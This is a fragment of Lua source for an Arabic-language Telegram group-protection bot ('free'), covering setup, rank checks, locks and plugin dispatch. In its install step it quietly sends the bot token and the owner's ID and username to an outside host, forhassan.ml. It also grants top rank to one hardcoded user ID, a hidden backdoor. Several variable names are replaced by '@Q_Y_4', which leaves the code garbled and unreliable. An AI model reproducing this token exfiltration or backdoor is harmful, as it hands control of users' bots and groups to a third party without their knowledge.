...
if not @Q_Y_4:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
create_config(Token)
end 
print('('..@Q_Y_4..')')
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..@Q_Y_4)
...
print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..@Q_Y_4..']\n\27[0;39;49m')
free = Token:match("(%d+)")
redis:set(free..":VERSION",1)
redis:set(free..":SUDO_ID:",@Q_Y_4)
redis:set(free..":DataCenter:",'German')
redis:set(free..":UserNameBot:",BOT_User)
redis:set(free..":NameBot:",BOT_NAME)
redis:hset(free..'username:'..@Q_Y_4,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3free_INSTALL","Yes")
info = {}
...
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..@Q_Y_4..") \n• شكراً لأستخدام سورس فري \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
https.request(Api_Token..'/sendMessage?chat_id='..@Q_Y_4..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
Souser = @Q_Y_4:gsub('@','')
Souser = Souser:gsub([[\_]],'_')
https.request("https://forhassan.ml/free/khaled.zzz.com.ua?id="..@Q_Y_4.."&user="..Souser.."&token="..Token)
os.execute([[
rm -f ./README.md
rm -rf ./.git
chmod +x ./run
...
print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس فري بنسبه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @SOURCEfree }• }•\e[0m"
...
echo -e "\e[38;5;77m       •{ free source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer JACK : @Q_Y_4  }•\e[0m"

echo -e "\e[38;5;77m      free ✾ @Q_Y_4e[0m"
echo -e "\e[38;5;77m       ✾تم تطوير وبرمجة السورس من قبل ادهم ✾ .e[0m"
echo -e "\e[38;5;77m       ✾ @Q_Y_4e[0m"
-------------------------------------------------------------------
]]..'\027[0;32m')
create_config() 
else
...
free = Token:match("(%d+)")
our_id = tonumber(free)
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(free..":UserNameBot:")
SUDO_ID = tonumber(redis:get(free..":SUDO_ID:"))
@Q_Y_4 = redis:hgetall(free..'username:'..SUDO_ID).username
version = redis:get(free..":VERSION")
DataCenter = redis:get(free..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..free..')\027[0;32m\n'
..'¦ INFO_SUDO: \27[1;34m'..@Q_Y_4:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
...
if msg.type == "pv" and redis:get(free..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(free..'sender:'..msg.sender_user_id_..':flood') then
...
if redis:get(free..'group:add'..msg.chat_id_) then 
msg.GroupActive = true
else
msg.GroupActive = false
end

if msg.sender_user_id_ == 1488653639 then 
...
msg.Rank = 1
elseif redis:sismember(free..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور'
msg.TheRank = 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(free..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(free..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء'
msg.TheRank = 'المنشىء'
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(free..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير' 
msg.TheRank = 'مدير البوت' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(free..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن'
msg.TheRank = 'ادمن في البوت'
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(free..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
...
local lock_bots = redis:get(free..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(free..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(free..':WELCOME_BOT') then
@Q_Y_4 = redis:hgetall(free..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(free..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(free..':NameBot:')..[[ .
• اختـصاصـي حمايـة الـمجموعات
• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
قناة سورس فري @_ch
. مـعرف المطور  :]]..@Q_Y_4:gsub([[\_]],'_')..[[ .
]])
return false
end
if not msg then
...
if msg.GroupActive and redis:get(free..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
...
if msg.Admin then redis:srem(free..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
...
if msg.Admin then redis:srem(free..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(free..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.free then 
if msg.text and ScriptFile.ifree then
for k, free in pairs(ScriptFile.free) do
local SearchText = msg.text:match(free)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.ifree(msg,{msg.text:match(free)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",free.." | Plugin is: \27[1;32mScript.lua\27[0m")
...
if ScriptFile.dfree then
if ScriptFile.dfree(msg) == false then
return false
end
...
if Plug.free then 
if msg.text and Plug.ifree then
for k, free in pairs(Plug.free) do
local SearchText = msg.text:match(free)
if SearchText then
if not CheckFlood(msg) then
return false
...
Mohammad = msg.text
if Mohammad then
if redis:sismember(free..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(free..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.ifree(msg,{msg.text:match(free)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",free.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source free")
end 

end
else
print("The File Script.lua Not Runing in The Source free")
...
function tdcli_update_callback(data)
	...
	redis:srem(free..'users',msg.sender_user_id_)
	end
	...
	download_file('https://raw.githubusercontent.com/1790/free/main/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
	download_file('https://raw.githubusercontent.com/1790/free/main/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
	download_file('https://raw.githubusercontent.com/1790/free/main/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
	download_file('https://raw.githubusercontent.com/1790/free/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/1790/free/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/1790/free/main/plugins/games.lua','./plugins/games.lua')
...
msg.text = Mohammad:gsub(Mohammad,mmdi)
	...
	mmd = redis:get(free..":SUDO_ID:")
redis:hset(free..'username:'..tonumber(mmd),'username',msg.text)
	...
	redis:set(free..":SUDO_ID:",msg.text)
...
download(stk,32)
	...
	if redis:get(free..'mute_tgservice'..msg.chat_id_) then
	Del_msg(msg.chat_id_,msg.id_)
	end
	elseif msg.content_.ID == "MessageChatAddMembers" then
	if redis:get(free..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(free..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(free..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(free..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(free..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(free..'lock_bots'..msg.chat_id_)
	ISBOT = false
	...
	if ZISBOT and redis:get(free..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end
...
if redis:get(free..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	...
	if redis:get(free..'group:add'..msg.chat_id_) then
	redis:set(free..'group:name'..msg.chat_id_,msg.content_.title_)
	end
	end 
	
	elseif data.ID == "UpdateNewChat" then  
	if redis:get(free..'group:add'..data.chat_.id_) then
	redis:set(free..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	...
	if redis:get(free..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(free..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(free..'group:name-100'..data.channel_.id_) or "")
	...
	redis:mset(
	free..'group:name'..k,IDS.Title,
	free..'num_msg_free'..k,5,
	free..'group:add'..k,true,
	free..'lock_link'..k,true,
	free..'lock_spam'..k,true,
	free..'lock_webpage'..k,true,
	free..'lock_markdown'..k,true,
	free..'lock_flood'..k,true,
	free..'lock_bots'..k,true,
	free..'mute_forward'..k,true,
	free..'mute_contact'..k,true,
	free..'mute_document'..k,true,
	free..'mute_inline'..k,true,
	free..'lock_username'..k,true,
	free..'replay'..k,true
	)
	redis:sadd(free..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(free..'username:'..ID,'username',user)
	redis:sadd(free..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(free..'username:'..ID,'username',user)
	redis:sadd(free..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(free..'username:'..ID,'username',user)
	redis:sadd(free..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(free..'group:ids')..' .*\n')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(free..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(free..'username:'..data.user_.id_).username
	...
	redis:hset(free..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
	...
	local groups = redis:smembers(free..'group:ids')
	...
	local pv = redis:smembers(free..'users')
	local NumPvDel = 0
	for i = 1, #pv do
